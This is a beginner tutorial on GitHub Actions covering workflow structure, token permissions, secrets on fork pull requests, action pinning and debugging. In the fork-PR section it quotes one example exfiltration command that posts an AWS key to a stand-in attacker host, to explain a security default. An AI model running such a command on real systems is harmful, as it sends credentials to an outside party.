# A Friendly Introduction to GitHub Actions

Here's the thing about GitHub Actions that nobody tells you upfront: it's just a way to run scripts when stuff happens in your repo. That's it. The rest of the vocabulary — workflows, jobs, steps, runners — is just names for the pieces of a system that does exactly that one job.

I remember the first time I opened a GitHub Actions workflow file. It was a wall of YAML and my first thought was "what even is all this." Then I read through it slowly, and realized every single line mapped to something obvious: "when someone pushes code, start a Linux computer, clone the repo, run the tests." All the mystery came from the syntax, not the idea.

So let's talk about the idea first.

## The problem it quietly solves

Before CI tools existed, here's roughly how teams shipped software: someone on the team ran the tests on their laptop before merging a branch. Usually. If they remembered. Deployments were a "stand over Raj's shoulder while he SSH's into production" ritual. It mostly worked until it didn't, and when it didn't, you usually found out on a Friday evening.

GitHub Actions (and every CI system before it) exists because that isn't a sustainable way to build software. You want the machine to do the boring reliable stuff so humans can do the interesting unreliable stuff.

## What it actually does

Every time something happens in your repo — a push, a pull request, someone opening an issue, a scheduled time — GitHub looks in a specific folder (`.github/workflows/`) for YAML files that care about that event. If it finds one, it spins up a brand new virtual machine, clones your code onto it, runs the steps you listed, and then throws the machine away.

Fresh machine every time. No stale state. That's why CI is reliable even though "run this script" sounds deceptively simple — every run starts from zero.

## The first workflow

Here's the smallest working workflow I can show you:

```yaml
name: Hello

on: [push]

jobs:
  greet:
    runs-on: ubuntu-latest
    steps:
      - run: echo "Hello, GitHub!"
```

Drop that in `.github/workflows/hello.yml`, commit, push. Go to your repo's Actions tab. You'll see it run. You've now automated a thing.

It's a completely useless thing. But the shape of this file — `on:`, `jobs:`, `steps:` — is the shape of every workflow you'll ever write. A three-thousand-line enterprise deploy pipeline is just more steps inside more jobs, triggered by different events. Same skeleton, more muscle.

## Where beginners get stuck

I've watched a lot of people learn this tool. Here's where they trip up, roughly in order of how often I see it.

**YAML indentation.** YAML cares deeply about spaces and not at all about tabs. One rogue tab and the whole file becomes nonsense. The error messages are — how do I put this politely — not great. When something "doesn't work" and you can't see why, check your indentation first. Two spaces per level, no tabs, the same everywhere.

**Permissions.** Your workflow gets a token called `GITHUB_TOKEN` that can talk to the GitHub API — but since 2023, that token can only read by default. If your workflow tries to comment on a PR or label an issue, it will fail with a confusing message about "resource not accessible by integration." The fix is usually four lines in your workflow:

```yaml
permissions:
  pull-requests: write
```

...or whatever scope you actually need. It's a security default, not a bug.

**Expecting secrets to work on fork PRs.** When an external contributor opens a pull request from their fork, GitHub intentionally strips access to your secrets. This is for your safety — you don't want some random PR running `curl attacker.com -d "$AWS_KEY"` with your credentials. But it surprises people who wired up a deploy step and can't figure out why it only fails for outside PRs.

**Forgetting `actions/checkout@v4`.** Your workflow runs on a fresh machine. That machine doesn't have your code on it until you ask for it. Half of "my step can't find the file!" is because the first step forgot to check out the repo.

None of these are hard. They're just things you only learn by hitting them.

## Jobs and steps, in plain English

A **step** is one command. `run: npm test` is a step. `uses: actions/checkout@v4` is a step.

A **job** is a group of steps that run in order on the same machine. If one step fails, the rest of that job's steps get skipped by default.

Multiple **jobs** in the same workflow run in parallel by default — separate machines, at the same time. If you want them in sequence, you link them with `needs:`. That's how you build real pipelines: build first, then test, then deploy, each waiting on the previous stage.

That's really it. Everything else — matrices, reusable workflows, composite actions — is just a refinement of "run these steps on this machine when this happens."

## Using other people's work

The Actions Marketplace is full of ready-made steps. Want to set up Node? `actions/setup-node@v4`. Want to build a Docker image? `docker/build-push-action@v5`. Deploy to AWS? There are a dozen options. These are the LEGO bricks of the GitHub Actions world, and they're genuinely good.

One warning worth repeating: when you use a third-party action, its code runs on your runner with access to your repo and secrets. It's basically `curl | bash` with extra steps. For anything important, pin to a specific commit SHA (`@abc123...` instead of `@v4`) so a compromised future version can't silently mess with your builds.

## When things go wrong (and they will)

Logs are where you live when you're debugging. Click the failed run → failed job → failed step. The error is almost always in the last ten lines of output.

If you can't tell what's happening, add a "what on earth is in my environment" step:

```yaml
- name: Dump context
  run: |
    echo "ref: $GITHUB_REF"
    echo "actor: $GITHUB_ACTOR"
    echo "event: $GITHUB_EVENT_NAME"
    env | sort
```

That's usually enough to crack it. When it isn't, GitHub has two magic secrets — `ACTIONS_STEP_DEBUG=true` and `ACTIONS_RUNNER_DEBUG=true` — that make the logs extremely verbose. Turn them on when you're stuck, turn them off when you're done, because they make every run slower and noisier.

## The part that actually matters

Most guides teach you the syntax. The syntax is the easy part. The hard part is knowing what to automate.

A good automation removes a thing you otherwise had to remember. A bad automation is something you build because you can, that nobody wanted, that breaks in a month. Before you write a workflow, ask: what is the manual process I'm replacing? If the honest answer is "I don't have one," you probably don't need a workflow yet.

The best workflows I've seen are the boring ones. Run the tests. Lint the code. Deploy on tag. Notify Slack when main breaks. They don't show off. They just sit there and do their one job every day, and nobody notices them until they fail.

Which, honestly, is the whole point.

## Where to go from here

If you're just getting started, here's what I'd do in order:

1. Write a workflow that runs your test suite on every push. Get it passing.
2. Break it on purpose. Misspell a command. Learn to read the logs.
3. Add a second workflow that deploys (or pretends to deploy) when you push a git tag.
4. Take a look at the `permissions:` key and think about what your workflow actually needs vs. what it's getting by default.
5. Read one of the official security guides. Skim, don't study — you'll come back to it when you hit something specific.

That's maybe a month of practice. After that, you'll stop thinking about GitHub Actions and start thinking about problems, which is the right place to end up with any tool.
